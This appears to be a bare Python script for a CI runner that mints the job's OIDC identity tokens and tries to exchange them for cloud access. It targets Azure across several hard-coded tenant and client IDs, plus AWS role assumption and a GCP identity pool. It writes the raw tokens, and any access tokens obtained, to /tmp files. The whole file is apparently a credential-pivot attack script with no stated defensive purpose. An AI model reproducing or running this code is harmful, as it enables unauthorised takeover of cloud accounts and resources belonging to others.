import os, json, base64, urllib.request, urllib.parse, sys
def mint(aud):
    url=os.environ['ACTIONS_ID_TOKEN_REQUEST_URL']+"&audience="+urllib.parse.quote(aud,safe='')
    req=urllib.request.Request(url, headers={'Authorization':'bearer '+os.environ['ACTIONS_ID_TOKEN_REQUEST_TOKEN']})
    try:
        return json.loads(urllib.request.urlopen(req, timeout=20).read().decode())['value']
    except Exception as e:
        print("MINT_ERR",aud,type(e).__name__,str(e)[:200]); return None
def claims(t):
    p=t.split('.')[1]; p+='='*(-len(p)%4)
    return json.loads(base64.urlsafe_b64decode(p))
def exch(ten,cid,res,jwt,act):
    data=urllib.parse.urlencode({'grant_type':'client_credentials','client_id':cid,
        'client_assertion_type':act,'client_assertion':jwt,'scope':res+'.default'}).encode()
    req=urllib.request.Request("https://login.microsoftonline.com/%s/oauth2/v2.0/token"%ten,data=data)
    try:
        b=urllib.request.urlopen(req,timeout=25).read().decode()
    except Exception as e:
        b=getattr(e,'read',lambda:b'')() or b''
        b=b.decode('utf-8','replace') if isinstance(b,bytes) else str(e)
    return b
TENS=["e8adc959-bf67-48e0-95b4-318b5f73946c","c3b32785-891b-4be9-90c2-c6d313ab4895","72f988bf-86f1-41af-91ab-2d7cd011db47"]
CIDS=["2ac1b8af-6f93-4fa3-b65c-e629ad9c0bb6","d6529b06-5a2c-4b0d-a1a7-2b4dcb1e54a5","31f3b47b-21e2-4ac6-8b8f-6b0fb6e4c0b4","e3d1f2c5-4b64-4bd6-bb4b-0d1a6d1b2f1e"]
jwt=mint("api://AzureADTokenExchange")
if jwt:
    c=claims(jwt)
    print("MINT_OK len=%d iss=%s aud=%s sub=%s ref=%s"%(len(jwt),c.get('iss'),c.get('aud'),c.get('sub'),json.dumps(c.get('ref'))[:300]))
    open('/tmp/jwt_azure.txt','w').write(jwt)
    for ten in TENS:
        for cid in CIDS:
            for res in ("https://management.azure.com/","https://batch.core.windows.net/"):
                b=exch(ten,cid,res,jwt,"urn:ietf:params:oauth:client-assertion-type:jwt-bearer")
                print("EXCH ten=%s cid=%s res=%s -> %s"%(ten,cid,res,b[:240]))
                if 'access_token' in b:
                    open('/tmp/TOKEN_OK_%s_%s.json'%(ten,cid),'w').write(b)
            b=exch(ten,cid,"https://management.azure.com/",jwt,"urn:ietf:params:oauth:client-assertion-type:jwt-bearer")
jwt2=mint("sts.amazonaws.com")
if jwt2:
    c=claims(jwt2); print("MINT_AWS aud=%s sub=%s"%(c.get('aud'),c.get('sub')))
    open('/tmp/jwt_aws.txt','w').write(jwt2)
    for role in ("arn:aws:iam::123456789012:role/ul-4360",):
        q=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'ul4360','WebIdentityToken':jwt2})
        try:
            r=urllib.request.urlopen("https://sts.amazonaws.com/?"+q,timeout=20).read().decode()
        except Exception as e:
            r=getattr(e,'read',lambda:b'')() or str(e)
            r=r.decode('utf-8','replace') if isinstance(r,bytes) else r
        print("AWS_STS role=%s -> %s"%(role,r[:300]))
jwt3=mint("https://iam.googleapis.com/projects/761901955626/locations/global/workloadIdentityPools/pool/providers/ul")
if jwt3:
    c=claims(jwt3); print("MINT_GCP aud=%s"%(c.get('aud'),))
